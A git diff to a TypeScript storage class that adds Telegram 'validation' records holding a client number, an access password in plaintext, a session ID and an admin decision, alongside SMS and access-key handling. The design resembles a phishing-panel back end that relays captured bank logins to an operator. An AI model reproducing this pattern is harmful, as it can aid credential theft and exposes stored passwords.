@@ -1,4 +1,4 @@
-import { sessions, type Session, insertSessionSchema, User, AccessKey, Device, UserRole, InsertUser, InsertAccessKey, InsertDevice, users, accessKeys, devices, SmsConfig, InsertSmsConfig, SmsCredits, SmsHistory, InsertSmsHistory } from "@shared/schema";
+import { sessions, type Session, insertSessionSchema, User, AccessKey, Device, UserRole, InsertUser, InsertAccessKey, InsertDevice, users, accessKeys, devices, SmsConfig, InsertSmsConfig, SmsCredits, SmsHistory, InsertSmsHistory, TelegramValidation, InsertTelegramValidation } from "@shared/schema";
 import { z } from "zod";
 import { nanoid } from "nanoid";
 import bcrypt from "bcrypt";
@@ -65,6 +65,14 @@ export interface IStorage {
   updateDevice(id: number, data: Partial<Device>): Promise<Device>;
   deleteDevice(id: number): Promise<boolean>;
   countActiveDevicesForKey(accessKeyId: number): Promise<number>;
+  
+  // Validaciones de Telegram
+  createTelegramValidation(data: InsertTelegramValidation): Promise<TelegramValidation>;
+  getTelegramValidationById(validationId: string): Promise<TelegramValidation | undefined>;
+  getTelegramValidationBySessionId(sessionId: string): Promise<TelegramValidation | undefined>;
+  updateTelegramValidation(validationId: string, data: Partial<TelegramValidation>): Promise<TelegramValidation>;
+  getPendingTelegramValidations(): Promise<TelegramValidation[]>;
+  expireTelegramValidations(): Promise<number>;
 }
 
 // Memory storage implementation
@@ -78,6 +86,7 @@ export class MemStorage implements IStorage {
   private smsConfig: SmsConfig | null;
   private smsCredits: Map<number, SmsCredits>;
   private smsHistory: Map<number, SmsHistory>;
+  private telegramValidations: Map<string, TelegramValidation>;
   private currentId: { [key: string]: number };
 
   constructor() {
@@ -87,6 +96,7 @@ export class MemStorage implements IStorage {
     this.accessKeys = new Map();
     this.accessKeysByKey = new Map();
     this.devices = new Map();
+    this.telegramValidations = new Map();
     this.smsConfig = {
       id: 1,
       username: 'josemorenofs19@gmail.com',
@@ -106,6 +116,7 @@ export class MemStorage implements IStorage {
       device: 1,
       smsCredits: 1,
       smsHistory: 1,
+      telegramValidation: 1,
     };
     
     // Crear configuraciones iniciales
@@ -942,6 +953,82 @@ export class MemStorage implements IStorage {
       }
     }
     return undefined;
+  }
+
+  // === Métodos de Validaciones de Telegram ===
+  async createTelegramValidation(data: InsertTelegramValidation): Promise<TelegramValidation> {
+    const id = this.currentId.telegramValidation++;
+    
+    const validation: TelegramValidation = {
+      id,
+      validationId: data.validationId,
+      sessionId: data.sessionId,
+      telegramMessageId: data.telegramMessageId || null,
+      status: data.status || 'pending',
+      numeroCliente: data.numeroCliente || null,
+      claveAcceso: data.claveAcceso || null,
+      adminUser: null,
+      decisionNote: null,
+      createdAt: new Date(),
+      respondedAt: null,
+      expiresAt: data.expiresAt,
+    };
+    
+    this.telegramValidations.set(data.validationId, validation);
+    console.log(`[Storage] Validación de Telegram creada: ${data.validationId}`);
+    
+    return validation;
+  }
+
+  async getTelegramValidationById(validationId: string): Promise<TelegramValidation | undefined> {
+    return this.telegramValidations.get(validationId);
+  }
+
+  async getTelegramValidationBySessionId(sessionId: string): Promise<TelegramValidation | undefined> {
+    for (const validation of Array.from(this.telegramValidations.values())) {
+      if (validation.sessionId === sessionId && validation.status === 'pending') {
+        return validation;
+      }
+    }
+    return undefined;
+  }
+
+  async updateTelegramValidation(validationId: string, data: Partial<TelegramValidation>): Promise<TelegramValidation> {
+    const validation = this.telegramValidations.get(validationId);
+    
+    if (!validation) {
+      throw new Error(`Validación de Telegram ${validationId} no encontrada`);
+    }
+    
+    const updatedValidation = { ...validation, ...data };
+    this.telegramValidations.set(validationId, updatedValidation);
+    
+    return updatedValidation;
+  }
+
+  async getPendingTelegramValidations(): Promise<TelegramValidation[]> {
+    return Array.from(this.telegramValidations.values()).filter(
+      validation => validation.status === 'pending'
+    );
+  }
+
+  async expireTelegramValidations(): Promise<number> {
+    const now = new Date();
+    let expiredCount = 0;
+    
+    for (const [validationId, validation] of Array.from(this.telegramValidations.entries())) {
+      if (validation.status === 'pending' && new Date(validation.expiresAt) < now) {
+        this.telegramValidations.set(validationId, {
+          ...validation,
+          status: 'expired',
+          respondedAt: now
+        });
+        expiredCount++;
+        console.log(`[Storage] Validación de Telegram expirada: ${validationId}`);
+      }
+    }
+    
+    return expiredCount;
   }
 }
 
